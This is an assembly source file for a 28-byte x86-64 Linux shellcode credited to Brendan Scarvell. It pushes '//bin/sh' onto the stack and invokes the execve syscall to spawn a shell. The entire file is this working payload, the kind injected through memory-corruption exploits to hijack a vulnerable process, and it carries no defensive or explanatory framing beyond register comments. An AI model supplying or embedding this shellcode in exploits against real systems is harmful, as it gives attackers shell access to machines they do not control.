; execve /bin/sh - 28 Bytes
; author: Brendan Scarvell

[Bits 64]
section .text
    global _start
_start:
    xor rdx, rdx ; rdx = 0
    push rdx
    mov rax, 0x68732f6e69622f2f ; "//bin/sh" string
    push rax
    push rsp
    pop rdi
    push rdx
    push rdi
    push rsp
    pop rdx
    push rsp
    pop rsi
    push 0x3b     ; syscall execve
    pop rax
    syscall
